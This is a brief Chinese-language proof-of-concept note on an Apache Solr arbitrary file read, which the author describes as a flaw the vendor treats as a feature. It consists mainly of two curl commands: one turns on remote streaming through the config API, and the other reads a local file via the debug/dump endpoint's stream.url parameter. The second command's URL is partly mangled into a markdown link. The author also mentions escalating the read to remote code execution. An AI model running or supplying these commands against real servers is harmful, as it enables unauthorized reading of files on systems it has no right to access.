# Solr-file_read



一个官方觉得是feature而不修复的漏洞

如何read to RCE 值得思考



POC:

```
curl -d '{  "set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' http://192.168.33.130:8983/solr/db/config -H 'Content-type:application/json' 

curl "[http://192.168.33.130:8983/solr/db/debug/dump?para...](http://192.168.33.130:8983/solr/db/debug/dump?param=ContentStreams) -F "stream.url=file:///C:/a.txt" 
```



![image-20210318001430696](https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/18/85647_image-20210318001430696.png)